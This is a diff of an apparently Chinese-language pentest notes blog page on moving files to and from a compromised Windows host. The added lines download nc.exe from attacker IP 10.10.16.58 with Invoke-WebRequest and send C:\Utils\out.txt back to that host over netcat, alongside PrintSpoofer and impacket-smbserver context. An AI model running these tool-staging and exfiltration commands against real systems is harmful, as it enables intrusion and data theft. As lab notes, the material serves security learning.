@@ -48,7 +48,7 @@
 ┌──(kali㉿kali)-[~/Work] └─$ ls -liah PrintSpoofer64.exe 2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe ┌──(kali㉿kali)-[~/Work] └─$ sudo impacket-smbserver Enil . -smb2support [sudo] password for kali: Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed impacket-smbserver 必须添加参数 -smb2support 参数，即启用 SMB2 协议支持。">
   <meta itemprop="datePublished" content="2026-02-27T17:00:00+08:00">
   <meta itemprop="dateModified" content="2026-02-27T17:00:00+08:00">
-  <meta itemprop="wordCount" content="165">
+  <meta itemprop="wordCount" content="202">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -144,6 +144,7 @@
         <li><a href="#传入文件">传入文件</a></li>
         <li><a href="#certutil">Certutil</a></li>
         <li><a href="#impacket-smbserver">Impacket-smbserver</a></li>
+        <li><a href="#invoke-webrequest">Invoke-WebRequest</a></li>
         <li><a href="#传出文件">传出文件</a></li>
       </ul>
     </li>
@@ -202,8 +203,15 @@
 </span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
 </span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         27,136 bytes
 </span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,351,168 bytes free
+</span></span></code></pre></div><h3 id="invoke-webrequest">Invoke-WebRequest</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#39;http://10.10.16.58/nc.exe&#39;</span> -OutFile <span style="color:#e6db74">&#39;C:\Utils\nc.exe&#39;</span>
 </span></span></code></pre></div><h3 id="传出文件">传出文件</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>download
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>tils&gt; cmd /c <span style="color:#e6db74">&#34;C:\Utils\nc64.exe 10.10.16.58 408 &lt; C:\Utils\out.txt&#34;</span>
+</span></span><span style="display:flex;"><span>cmd /c <span style="color:#e6db74">&#34;C:\Utils\nc64.exe 10.10.16.58 408 &lt; C:\Utils\out.txt&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah out.txt 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2782113</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 127K Mar <span style="color:#ae81ff">17</span> 09:10 out.txt
 </span></span></code></pre></div>
             </div>
         </article>
